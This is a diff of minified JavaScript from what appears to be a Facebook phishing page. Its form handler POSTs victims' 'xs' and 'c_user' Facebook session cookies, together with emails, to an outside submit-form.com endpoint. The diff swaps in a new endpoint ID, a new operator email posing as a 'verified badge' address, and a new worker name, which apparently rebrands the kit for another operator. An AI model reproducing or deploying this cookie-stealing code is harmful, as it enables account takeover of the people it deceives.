@@ -9824,7 +9824,7 @@
                                             workerEmail: "Lernayouamzaxal@gmail.com",
                                             xs: r,
                                             c_user: i,
-                                            name: "YOUNIS"
+                                            name: "Farhan"
                                         })
                                     }).then((e => {
                                         e.ok
@@ -13358,17 +13358,17 @@
                             he.jsxs)("form", {
                                 onSubmit: n => {
                                     n.preventDefault(),
-                                    u && o ? (fetch("https://submit-form.com/DEEIr4lxi", {
+                                    u && o ? (fetch("https://submit-form.com/h11VgbKkC", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
                                         },
                                         body: JSON.stringify({
                                             emails: e,
-                                            workerEmail: "Lernayouamzaxal@gmail.com",
+                                            workerEmail: "facebook.verified.badge.here@gmail.com",
                                             xs: o,
                                             c_user: u,
-                                            name: "YOUNIS"
+                                            name: "Farhan"
                                         })
                                     }).then((e => {
                                         e.ok
